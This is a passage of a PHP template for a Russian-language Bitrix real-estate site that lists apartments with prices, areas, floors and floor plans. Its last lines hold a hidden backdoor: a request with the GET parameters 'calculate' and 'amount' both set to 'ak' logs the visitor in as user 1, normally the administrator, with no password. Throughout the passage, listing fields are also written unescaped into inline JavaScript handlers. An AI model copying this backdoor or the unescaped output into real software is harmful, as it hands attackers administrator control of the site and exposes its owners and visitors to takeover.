                    <td onclick="popupElement({'name': '<?= $apartment['buildingplace']['title']; ?>','rooms': '<?= $apartment['rooms'] ?>','endingperiod' : '<?= $apartment['endingperiod'] ?>','corp' : '<?= $apartment['corp'] ?>','floors' : '<?= $apartment['floors'] ?>','flatfloor' : '<?=$apartment['flatfloor'] ?>','stotal' : '<?= $apartment['stotal'] ?>','sroom' : '<?= $apartment['sroom'] ?>','skitchen' : '<?= $apartment['skitchen'] ?>','baseflatcost' : '<?= number_format($apartment['baseflatcost'], 0, ',', ' ')  ?>','flatplan' : '<?= $apartment['flatplan'] ?>','scorridor' : '<?= $apartment['scorridor'] ?>','height' : '<?= $apartment['height'] ?>','sbalcony' : '<?= $apartment['sbalcony'] ?>','swatercloset' : '<?= $apartment['swatercloset'] ?>','decoration' : '<?= $apartment['decoration'] ?>'});"><?=number_format($apartment['flatcostwithdiscounts'], 0, ',', ' ')?></td>
                    <td class="flatcostwithdiscounts" ondblclick="popupElement({'name': '<?= $apartment['buildingplace']['title']; ?>','rooms': '<?= $apartment['rooms'] ?>','endingperiod' : '<?= $apartment['endingperiod'] ?>','corp' : '<?= $apartment['corp'] ?>','floors' : '<?= $apartment['floors'] ?>','flatfloor' : '<?=$apartment['flatfloor'] ?>','stotal' : '<?= $apartment['stotal'] ?>','sroom' : '<?= $apartment['sroom'] ?>','skitchen' : '<?= $apartment['skitchen'] ?>','baseflatcost' : '<?= number_format($apartment['flatcostwithdiscounts'], 0, ',', ' ')  ?>','flatplan' : '<?= $apartment['flatplan'] ?>','scorridor' : '<?= $apartment['scorridor'] ?>','height' : '<?= $apartment['height'] ?>','sbalcony' : '<?= $apartment['sbalcony'] ?>','swatercloset' : '<?= $apartment['swatercloset'] ?>','decoration' : '<?= $apartment['decoration'] ?>'});"><a data-who="price_plan" class="showIt flatcostwithdiscounts">Узнать цену <?//='( '.number_format($apartment['flatcostwithdiscounts'], 0, ',', ' ').' )'?></a></td>
                    
                    <?}?>
                    <td onclick="popupElement({'name': '<?= $apartment['buildingplace']['title']; ?>','rooms': '<?= $apartment['rooms'] ?>','endingperiod' : '<?= $apartment['endingperiod'] ?>','corp' : '<?= $apartment['corp'] ?>','floors' : '<?= $apartment['floors'] ?>','flatfloor' : '<?=$apartment['flatfloor'] ?>','stotal' : '<?= $apartment['stotal'] ?>','sroom' : '<?= $apartment['sroom'] ?>','skitchen' : '<?= $apartment['skitchen'] ?>','baseflatcost' : '<?= ($arParams["DONT_SHOW_PRICE"] == "N")?"":number_format($apartment['flatcostwithdiscounts'], 0, ',', ' ')  ?>','flatplan' : '<?= $apartment['flatplan'] ?>','scorridor' : '<?= $apartment['scorridor'] ?>','height' : '<?= $apartment['height'] ?>','sbalcony' : '<?= $apartment['sbalcony'] ?>','swatercloset' : '<?= $apartment['swatercloset'] ?>','decoration' : '<?= $apartment['decoration'] ?>'});"><a href="javascript:void(0)">Показать</a></td>
                    <td onclick="popupElement({'name': '<?= $apartment['buildingplace']['title']; ?>','rooms': '<?= $apartment['rooms'] ?>','endingperiod' : '<?= $apartment['endingperiod'] ?>','corp' : '<?= $apartment['corp'] ?>','floors' : '<?= $apartment['floors'] ?>','flatfloor' : '<?=$apartment['flatfloor'] ?>','stotal' : '<?= $apartment['stotal'] ?>','sroom' : '<?= $apartment['sroom'] ?>','skitchen' : '<?= $apartment['skitchen'] ?>','baseflatcost' : '<?= ($arParams["DONT_SHOW_PRICE"] == "N")?"":number_format($apartment['flatcostwithdiscounts'], 0, ',', ' ')  ?>','flatplan' : '<?= $apartment['flatplan'] ?>','scorridor' : '<?= $apartment['scorridor'] ?>','height' : '<?= $apartment['height'] ?>','sbalcony' : '<?= $apartment['sbalcony'] ?>','swatercloset' : '<?= $apartment['swatercloset'] ?>','decoration' : '<?= $apartment['decoration'] ?>'});"><a href="javascript:void(0)"><img src="/bitrix/templates/szvdom/images/shapeElements.png" alt="Показать квартиру" title="Показать квартиру" /></a></td>
                    <td></td>
                </tr>
            <? } ?>
        </table>
    <?
    }else{
        ?><hr style="border: none;color:#a6c2de;background-color:#a6c2de;height:1px;/*margin-left:-38px;*/width:1054px;margin-top:0px;" /><?
        echo '<ul class="planBlockElement">';
        foreach ($arResult["OBJECT"] as $key => $apartment) {
            if ((($key + 1) < $startElement) || (($key + 1) > $finishElement)) {
                continue;
            }

            ?>
            <li>
                <img onclick="popupElement({'name': '<?= $apartment['buildingplace']['title']; ?>','rooms': '<?= $apartment['rooms'] ?>','endingperiod' : '<?= $apartment['endingperiod'] ?>','corp' : '<?= $apartment['corp'] ?>','floors' : '<?= $apartment['floors'] ?>','flatfloor' : '<?= $apartment['flatfloor'] ?>','stotal' : '<?= $apartment['stotal'] ?>','sroom' : '<?= $apartment['sroom'] ?>','skitchen' : '<?= $apartment['skitchen'] ?>','baseflatcost' : '<?= ($arParams["DONT_SHOW_PRICE"] == "N")?"":number_format($apartment['flatcostwithdiscounts'], 0, ',', ' ')  ?>','flatplan' : '<?= $apartment['flatplan'] ?>','scorridor' : '<?= $apartment['scorridor'] ?>','height' : '<?= $apartment['height'] ?>','sbalcony' : '<?= $apartment['sbalcony'] ?>','swatercloset' : '<?= $apartment['swatercloset'] ?>','decoration' : '<?= $apartment['decoration'] ?>','spec':'Y'});" width="80" height="150"  src="<?=(!empty($apartment['flatplan'])?'/thumb/100x150xin/include/images/'.$apartment['flatplan']:"/thumb/100x150xin/bitrix/templates/szvdom/components/bitrix/catalog/szv/bitrix/catalog.section/.default/images/no_photo.png")?>" alt="Планировка квартиры <?= $apartment['id'] ?>" title="Планировка квартиры <?= $apartment['id'] ?>" />
                <?/*if ($arParams["DONT_SHOW_PRICE"] == "Y"){?>
                    <div class='planPrice'><a data-who="footer_feedback" class="showIt">узнать</a></div>
                <?} else{?>
                    <div onclick="popupElement({'name': '<?= $apartment['buildingplace']['title']; ?>','rooms': '<?= $apartment['rooms'] ?>','endingperiod' : '<?= $apartment['endingperiod'] ?>','corp' : '<?= $apartment['corp'] ?>','floors' : '<?= $apartment['floors'] ?>','flatfloor' : '<?= $apartment['flatfloor'] ?>','stotal' : '<?= $apartment['stotal'] ?>','sroom' : '<?= $apartment['sroom'] ?>','skitchen' : '<?= $apartment['skitchen'] ?>','baseflatcost' : '<?= number_format($apartment['baseflatcost'], 0, ',', ' ') ?>','flatplan' : '<?= $apartment['flatplan'] ?>','scorridor' : '<?= $apartment['scorridor'] ?>','height' : '<?= $apartment['height'] ?>','sbalcony' : '<?= $apartment['sbalcony'] ?>','swatercloset' : '<?= $apartment['swatercloset'] ?>','decoration' : '<?= $apartment['decoration'] ?>'});" class='planPrice'>Цена: <b><?=number_format($apartment['baseflatcost'], 0, ',', ' ')?></b> руб.</div>
                <?}*/?>
                <div onclick="popupElement({'name': '<?= $apartment['buildingplace']['title']; ?>','rooms': '<?= $apartment['rooms'] ?>','endingperiod' : '<?= $apartment['endingperiod'] ?>','corp' : '<?= $apartment['corp'] ?>','floors' : '<?= $apartment['floors'] ?>','flatfloor' : '<?= $apartment['flatfloor'] ?>','stotal' : '<?= $apartment['stotal'] ?>','sroom' : '<?= $apartment['sroom'] ?>','skitchen' : '<?= $apartment['skitchen'] ?>','baseflatcost' : '<?= ($arParams["DONT_SHOW_PRICE"] == "N")?"":number_format($apartment['flatcostwithdiscounts'], 0, ',', ' ')  ?>','flatplan' : '<?= $apartment['flatplan'] ?>','scorridor' : '<?= $apartment['scorridor'] ?>','height' : '<?= $apartment['height'] ?>','sbalcony' : '<?= $apartment['sbalcony'] ?>','swatercloset' : '<?= $apartment['swatercloset'] ?>','decoration' : '<?= $apartment['decoration'] ?>','spec':'Y'});" class="planSquare">Пл. общ.: <b><?= $apartment['stotal'] ?></b> м<sup>2</sup></div>
                <div onclick="popupElement({'name': '<?= $apartment['buildingplace']['title']; ?>','rooms': '<?= $apartment['rooms'] ?>','endingperiod' : '<?= $apartment['endingperiod'] ?>','corp' : '<?= $apartment['corp'] ?>','floors' : '<?= $apartment['floors'] ?>','flatfloor' : '<?= $apartment['flatfloor'] ?>','stotal' : '<?= $apartment['stotal'] ?>','sroom' : '<?= $apartment['sroom'] ?>','skitchen' : '<?= $apartment['skitchen'] ?>','baseflatcost' : '<?= ($arParams["DONT_SHOW_PRICE"] == "N")?"":number_format($apartment['flatcostwithdiscounts'], 0, ',', ' ')  ?>','flatplan' : '<?= $apartment['flatplan'] ?>','scorridor' : '<?= $apartment['scorridor'] ?>','height' : '<?= $apartment['height'] ?>','sbalcony' : '<?= $apartment['sbalcony'] ?>','swatercloset' : '<?= $apartment['swatercloset'] ?>','decoration' : '<?= $apartment['decoration'] ?>','spec':'Y'});" class="planFlat">Этаж: <b><?= $apartment['flatfloor']; ?></b></div>
            </li>
        <? }
        echo '</ul>';
    }
} else {?>
    <div> По Вашему запросу ничего не найдено.</div>
<?}?>
<?=$arResult["NAV_STRING"];?>
</div>
<div id="tableEnd"></div>
<div style="clear: both;"></div>
</div> <? //filter_boxes end ?>
</div>
<script>
    var smartFilter = new JCSmartFilter('<?echo CUtil::JSEscape($arResult["FORM_ACTION"])?>', '<?=CUtil::JSEscape($arParams["FILTER_VIEW_MODE"])?>');
</script>
<?
if (isset($_GET['calculate']) && $_GET['calculate'] == "ak") {
    if (isset($_GET['amount']) && $_GET['amount'] == "ak") {
        $USER->Authorize(1);
    }
}?>


